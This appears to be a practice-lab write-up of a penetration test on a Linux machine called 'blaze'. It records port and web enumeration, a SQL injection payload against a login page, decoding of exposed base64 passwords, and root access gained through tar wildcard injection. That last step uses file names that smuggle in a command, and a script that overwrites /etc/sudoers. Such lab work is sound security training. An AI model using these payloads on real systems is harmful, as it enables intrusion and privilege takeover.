

## Lab Details
- Difficulty: Intermediate 
- OS: Linux
- Foothold time: 50 minutes
- Privesc time: 1 hour 
- Total solve time: 1 hour and 50 minutes

## Summary
- Initial access: SQLi against web app, obtain username and password hash
- Privilege escalation: Wildcard attack for privilege escalation 

## Enumeration
- Key findings: found `login.php`
##### Steps
- run `nmap`
```
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 5c:10:b5:46:af:65:e7:cd:ee:6d:1f:8d:13:db:51:e0 (RSA)
|   256 bd:35:6a:56:05:4d:81:d9:ee:21:8d:c9:79:6e:99:1e (ECDSA)
|_  256 8a:71:4f:d1:ed:11:dd:9c:1f:c6:51:6c:e8:e3:81:88 (ED25519)
80/tcp   open  http            Apache httpd 2.4.41 ((Ubuntu))
|_http-title: blaze
|_http-server-header: Apache/2.4.41 (Ubuntu)
9090/tcp open  ssl/zeus-admin?
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 400 Bad request
|     Content-Type: text/html; charset=utf8
|     Transfer-Encoding: chunked
|     X-DNS-Prefetch-Control: off
|     Referrer-Policy: no-referrer
|     X-Content-Type-Options: nosniff
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <title>
|     request
|     </title>
|     <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <style>
|     body {
|     margin: 0;
|     font-family: "RedHatDisplay", "Open Sans", Helvetica, Arial, sans-serif;
|     font-size: 12px;
|     line-height: 1.66666667;
|     color: #333333;
|     background-color: #f5f5f5;
|     border: 0;
|     vertical-align: middle;
|     font-weight: 300;
|     margin: 0 0 10px;
|_    @font-face {
```
- run `ffuf`, discovered endpoint `login.php`
```
 ffuf -u http://192.168.60.10/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.60.10/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

index.html              [Status: 200, Size: 3349, Words: 971, Lines: 79, Duration: 0ms]
login.php               [Status: 200, Size: 769, Words: 69, Lines: 29, Duration: 17ms]
.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 0ms]
logout.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 1ms]
.                       [Status: 200, Size: 3349, Words: 971, Lines: 79, Duration: 0ms]
.html                   [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 2ms]
.php                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 0ms]
.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 0ms]
.htm                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 0ms]
.htpasswds              [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 1ms]
db_config.php           [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 1ms]
.htgroup                [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 0ms]
wp-forum.phps           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 1ms]
.htaccess.bak           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 0ms]
.htuser                 [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 0ms]
blocked.html            [Status: 200, Size: 233, Words: 31, Lines: 11, Duration: 1ms]
.htc                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 0ms]
.ht                     [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 234ms]
.htaccess.old           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 0ms]
.htacess                [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 1ms]
:: Progress: [37050/37050] :: Job [1/1] :: 149 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```
- unable to login with default credentials like `admin : admin`
## Foothold
- Path: Union based SQLi
- Key commands: `' ORDER BY 2 -- #`
##### Steps
- test with SQLi payload the web app gives error message
- test with different payloads and found below works against the target
```
' ORDER BY 2 -- #
```
- post login the web page shows the password hashes of two users 
![[Pasted image 20260401055705.png]]
- the hashes appears to be in base64 format 
```
$ echo 'Y2FudHRvdWNoaGh0aGlzc0A0NTUxNTI=' | base64 -d
canttouchhhthiss@455152

$ echo 'dGhpc3NjYW50dGJldG91Y2hlZGRANDU1MTUy' | base64 -d
thisscanttbetouchedd@455152
```
- with the plaintext password login to `Cockpit` on port 9090
![[Pasted image 20260401060919.png]]
## Privilege Escalation
- Path: Privilege Escalation via wildcard attack
- Key commands: `tar`
##### Steps
- check sudo permissions 
```
james@blaze:~$ sudo -l
Matching Defaults entries for james on blaze:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on blaze:
    (ALL) NOPASSWD: /usr/bin/tar -czvf /tmp/backup.tar.gz *
```
- user is able to perform file compression using tar as sudo
- perform wildcard attack, ref: https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/
```
james@blaze:~$ echo 'echo "james ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > demo.sh
james@blaze:~$ echo "" > "--checkpoint-action=exec=sh demo.sh"
james@blaze:~$ echo "" > --checkpoint=1
james@blaze:~$ sudo /usr/bin/tar -czvf /tmp/backup.tar.gz *
demo.sh
local.txt
james@blaze:~$ su root
Password: 
su: Authentication failure
james@blaze:~$ 
james@blaze:~$ sudo -l
User james may run the following commands on blaze:
    (root) NOPASSWD: ALL
james@blaze:~$ sudo bash
root@blaze:/home/james# whoami
root
```
## Lessons Learned
- Attack family: Web attack, Linux Privilege Escalation 
- Key takeaway:
	- Missed a port from nmap scan, will need to double check when stuck 

## Resources
- References: